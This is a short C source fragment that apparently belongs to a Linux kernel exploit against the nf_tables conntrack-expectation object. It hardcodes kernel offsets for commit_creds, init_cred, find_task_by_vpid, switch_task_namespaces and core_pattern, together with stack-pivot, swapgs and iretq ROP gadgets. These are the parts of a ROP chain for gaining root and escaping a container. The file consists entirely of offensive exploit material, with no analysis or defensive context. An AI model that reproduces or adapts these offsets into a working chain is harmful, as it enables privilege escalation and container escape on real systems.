#include <stddef.h>
#include <unistd.h>
size_t nft_ct_expect_obj_type = 0x271c120;
size_t nft_ct_expect_obj_ops = 0x1acba40;
size_t init_cred = 0x2462180;
size_t init_nsproxy = 0x2461f40;
size_t core_pattern = 0x259e7a0;
size_t commit_creds = 0x10e830;
size_t find_task_by_vpid = 0x105680;
size_t switch_task_namespaces = 0x10ce30;
size_t rcu_read_unlock = 0x120127b; // Symbol '__rcu_read_unlock' not found. (use ret here)
size_t copy_from_user = 0x776520;
size_t msleep = 0x16a030;
size_t delay_loop = 0x7d6c70;

size_t push_rax_jmp_deref_rsi_0x77 = 0x9e4c3c; // push rax ; jmp qword ptr [rsi - 0x77]
size_t push_rsi_jmp_deref_rsi_0x39 = 0x8a2d27; // push rsi ; jmp qword ptr [rsi + 0x39]
size_t swapgs = 0x1201278; // asm_load_gs_index
size_t iretq = 0x12011a7; // common_interrupt_return
size_t pop_rdi = 0x81910;
size_t pop_rsi = 0x1a9d38;
size_t pop_rcx = 0xaa4d3;
size_t pop_rax = 0xfe1ba;
size_t pop_rdx = 0x1a9725;
size_t pop_rsp_ret = 0x106deb;
size_t add_rsp_0x50 = 0x190786; // add rsp, 0x50 ; jmp 0xffffffff82203980 (ret)
size_t pop_3 = 0x68158; // pop r12 ; pop rbp ; pop rbx ; ret
size_t pop_2 = 0x6815a; // pop rbp ; pop rbx ; ret
